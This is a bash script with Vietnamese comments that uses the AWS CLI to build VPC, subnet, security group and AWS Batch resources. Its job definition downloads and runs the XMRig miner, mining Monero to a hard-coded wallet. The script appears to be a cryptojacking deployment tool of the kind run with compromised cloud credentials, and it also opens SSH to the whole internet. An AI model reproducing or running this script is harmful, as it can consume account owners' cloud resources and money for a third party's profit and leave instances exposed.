#!/bin/bash

set -e  # Dừng script nếu có lỗi

AWS_REGION="us-east-1"
VPC_NAME="MyVPC"
SUBNET_NAME="MySubnet"
SECURITY_GROUP_NAME="MySecurityGroup"
COMPUTE_ENV_NAME="MyComputeEnv"
JOB_QUEUE_NAME="MyJobQueue"
JOB_DEFINITION_NAME="MyXMRigJob"
JOB_NAME="XMRigMiningJob"
SERVICE_ROLE_NAME="AWSBatchServiceRole"
INSTANCE_ROLE_NAME="AWSBatchInstanceRole"
INSTANCE_PROFILE_NAME="AWSBatchInstanceProfile"
MONERO_WALLET="88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV"

echo "=== Bước 1: Kiểm tra hoặc tạo VPC ==="
VPC_ID=$(aws ec2 describe-vpcs --filters "Name=is-default,Values=true" --query "Vpcs[0].VpcId" --output text)

if [ "$VPC_ID" == "None" ]; then
    VPC_ID=$(aws ec2 create-vpc --cidr-block 10.0.0.0/16 --query "Vpc.VpcId" --output text)
    aws ec2 create-tags --resources $VPC_ID --tags Key=Name,Value=$VPC_NAME
    echo "Tạo VPC mới: $VPC_ID"
else
    echo "Sử dụng VPC mặc định: $VPC_ID"
fi

echo "=== Bước 2: Kiểm tra hoặc tạo Subnet ==="
SUBNET_ID=$(aws ec2 describe-subnets --filters "Name=vpc-id,Values=$VPC_ID" --query "Subnets[0].SubnetId" --output text)

if [ "$SUBNET_ID" == "None" ]; then
    SUBNET_ID=$(aws ec2 create-subnet --vpc-id $VPC_ID --cidr-block 10.0.1.0/24 --query "Subnet.SubnetId" --output text)
    aws ec2 create-tags --resources $SUBNET_ID --tags Key=Name,Value=$SUBNET_NAME
    echo "Tạo Subnet mới: $SUBNET_ID"
else
    echo "Sử dụng Subnet có sẵn: $SUBNET_ID"
fi

echo "=== Bước 3: Kiểm tra hoặc tạo Security Group ==="
SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters "Name=vpc-id,Values=$VPC_ID" "Name=group-name,Values=$SECURITY_GROUP_NAME" --query "SecurityGroups[0].GroupId" --output text)

if [ "$SECURITY_GROUP_ID" == "None" ]; then
    SECURITY_GROUP_ID=$(aws ec2 create-security-group --group-name $SECURITY_GROUP_NAME --description "Security Group for AWS Batch" --vpc-id $VPC_ID --query "GroupId" --output text)
    aws ec2 authorize-security-group-ingress --group-id $SECURITY_GROUP_ID --protocol tcp --port 22 --cidr 0.0.0.0/0
    aws ec2 authorize-security-group-ingress --group-id $SECURITY_GROUP_ID --protocol tcp --port 443 --cidr 0.0.0.0/0
    echo "Tạo Security Group mới: $SECURITY_GROUP_ID"
else
    echo "Sử dụng Security Group có sẵn: $SECURITY_GROUP_ID"
fi

echo "=== Bước 4: Kiểm tra & Xóa Compute Environment nếu đã tồn tại ==="
if aws batch describe-compute-environments --compute-environments $COMPUTE_ENV_NAME >/dev/null 2>&1; then
    echo "Compute Environment đã tồn tại. Đang tắt..."
    aws batch update-compute-environment --compute-environment $COMPUTE_ENV_NAME --state DISABLED

    echo "Chờ Compute Environment về trạng thái DISABLED..."
    while true; do
        STATUS=$(aws batch describe-compute-environments --compute-environments $COMPUTE_ENV_NAME --query "computeEnvironments[0].status" --output text)
        echo "Trạng thái hiện tại: $STATUS"
        if [ "$STATUS" == "DISABLED" ]; then break; fi
        sleep 5
    done

    echo "Xóa Compute Environment..."
    aws batch delete-compute-environment --compute-environment $COMPUTE_ENV_NAME
else
    echo "Compute Environment chưa tồn tại, bỏ qua bước xóa."
fi

echo "=== Bước 5: Tạo Compute Environment ==="
aws batch create-compute-environment --compute-environment-name $COMPUTE_ENV_NAME \
    --type MANAGED \
    --state ENABLED \
    --compute-resources "{
        \"type\": \"EC2\",
        \"minvCpus\": 0,
        \"maxvCpus\": 8,
        \"desiredvCpus\": 4,
        \"instanceTypes\": [\"c7a.2xlarge\"],
        \"subnets\": [\"$SUBNET_ID\"],
        \"securityGroupIds\": [\"$SECURITY_GROUP_ID\"]
    }"

echo "=== Kiểm tra trạng thái Compute Environment ==="
while true; do
    STATUS=$(aws batch describe-compute-environments --compute-environments $COMPUTE_ENV_NAME --query "computeEnvironments[0].status" --output text)
    echo "Trạng thái hiện tại: $STATUS"
    if [ "$STATUS" == "VALID" ]; then break; fi
    sleep 200
done

echo "=== Bước 6: Tạo Job Queue ==="
aws batch create-job-queue --job-queue-name $JOB_QUEUE_NAME --state ENABLED --priority 1 --compute-environment-order order=1,computeEnvironment=$COMPUTE_ENV_NAME

echo "=== Bước 7: Đăng ký Job Definition ==="
aws batch register-job-definition --job-definition-name $JOB_DEFINITION_NAME --type container --container-properties "{
    \"image\": \"ubuntu\",
    \"command\": [\"sh\", \"-c\", \"apt update && apt install -y wget tar && wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && ./xmrig-6.22.2/xmrig -o xmr-eu.kryptex.network:7029 -u $MONERO_WALLET -k --coin monero -a rx/8\"],
    \"memory\": 16384,
    \"vcpus\": 8
}"

echo "=== Bước 8: Gửi Job ==="
aws batch submit-job --job-name $JOB_NAME --job-queue $JOB_QUEUE_NAME --job-definition $JOB_DEFINITION_NAME
